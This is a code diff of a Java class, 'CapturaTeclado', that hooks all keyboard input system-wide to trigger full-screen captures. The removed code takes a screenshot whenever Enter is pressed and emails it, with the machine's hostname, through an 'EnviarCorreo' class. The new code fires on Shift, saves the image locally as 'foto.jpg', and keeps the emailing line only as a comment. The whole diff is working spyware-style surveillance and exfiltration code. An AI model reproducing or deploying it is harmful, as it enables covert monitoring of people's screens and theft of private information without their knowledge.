@@ -18,60 +18,40 @@ import javax.imageio.ImageIO;
 
 public class CapturaTeclado {
 
-	private static boolean run = true;
+  
 
-	public static void main(String[] args) {
-		
-																	
-		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of
-																		// raw input
-		
-		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
-			@Override
-			public void keyPressed(GlobalKeyEvent event) {
-				
-				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
-					//run = false;
-				}
-				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_RETURN) {
+    public static void main(String[] args) {
 
-					try {
-						Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
-						Rectangle screenRectangle = new Rectangle(screenSize);
-						Robot robot;
-						robot = new Robot();
-						BufferedImage image = robot.createScreenCapture(screenRectangle);
-						ByteArrayOutputStream baos = new ByteArrayOutputStream();
-						ImageIO.write(image, "jpg", baos);
-						//ImageIO.write(image, "jpg", new File("foto.jpg"));//Escribe en ruta local
-						byte[] byteImage = baos.toByteArray();
-						baos.flush();
-						baos.close();						
-						new EnviarCorreo(byteImage,InetAddress.getLocalHost().getHostName());
-					} catch (AWTException e) {
-						e.printStackTrace();
-					} catch (IOException e) {
-						e.printStackTrace();
-					} catch (Exception e) {
-						e.printStackTrace();
-					}
+        GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of                                                            // raw input
+        
+        keyboardHook.addKeyListener(new GlobalKeyAdapter() {
+            @Override
+            public void keyReleased(GlobalKeyEvent event) {
+                if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_SHIFT) {
+                    try {
+                        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
+                        Rectangle screenRectangle = new Rectangle(screenSize);
+                        Robot robot;
+                        robot = new Robot();
+                        BufferedImage image = robot.createScreenCapture(screenRectangle);
+                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                        // ImageIO.write(image, "jpg", baos);
+                        ImageIO.write(image, "jpg", new File("foto.jpg"));// Escribe en ruta local
+                        byte[] byteImage = baos.toByteArray();
+                        baos.flush();
+                        baos.close();
+                        // new EnviarCorreo(byteImage,InetAddress.getLocalHost().getHostName());
+                    } catch (AWTException e) {
+                        e.printStackTrace();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
 
-				}
+                }
 
-			}
-
-			@Override
-			public void keyReleased(GlobalKeyEvent event) {}
-		});
-
-		try {
-			while (run) {
-				Thread.sleep(500);
-			}
-		} catch (InterruptedException e) {
-			e.printStackTrace();
-		} finally {
-			keyboardHook.shutdownHook();
-		}
-	}
+            }
+        });
+    }
 }
